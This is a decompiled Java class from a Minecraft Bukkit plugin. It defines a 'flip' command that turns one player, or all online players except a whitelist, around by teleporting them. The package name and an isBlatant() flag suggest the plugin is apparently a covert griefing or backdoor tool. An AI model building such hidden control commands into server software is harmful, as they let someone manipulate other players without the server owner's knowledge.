/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.Location
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;

import java.util.concurrent.ExecutionException;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class FlipCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("flip <player>"));
        } else if (args[1].equals("*")) {
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                float newYaw;
                if (a2.getName().equals(p2.getName()) || plugin.lite.contains(a2.getName())) continue;
                Location playerLocation = a2.getLocation().clone();
                for (newYaw = playerLocation.getYaw() + 180.0f; newYaw < 0.0f; newYaw += 360.0f) {
                }
                while (newYaw > 360.0f) {
                    newYaw -= 360.0f;
                }
                playerLocation.setYaw(newYaw);
                plugin.getServer().getScheduler().runTaskAsynchronously((Plugin)plugin, () -> {
                    try {
                        Bukkit.getScheduler().callSyncMethod((Plugin)plugin, () -> a2.teleport(playerLocation)).get();
                    }
                    catch (InterruptedException | ExecutionException exception) {
                        // empty catch block
                    }
                });
            }
            p2.sendMessage(Settings.PREFIX("All players were flipped!"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                float newYaw;
                p2.sendMessage(Settings.PREFIX(target.getName() + " was flipped!"));
                Location playerLocation = target.getLocation().clone();
                for (newYaw = playerLocation.getYaw() + 180.0f; newYaw < 0.0f; newYaw += 360.0f) {
                }
                while (newYaw > 360.0f) {
                    newYaw -= 360.0f;
                }
                playerLocation.setYaw(newYaw);
                plugin.getServer().getScheduler().runTaskAsynchronously((Plugin)plugin, () -> {
                    try {
                        Bukkit.getScheduler().callSyncMethod((Plugin)plugin, () -> target.teleport(playerLocation)).get();
                    }
                    catch (InterruptedException | ExecutionException exception) {
                        // empty catch block
                    }
                });
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }


}

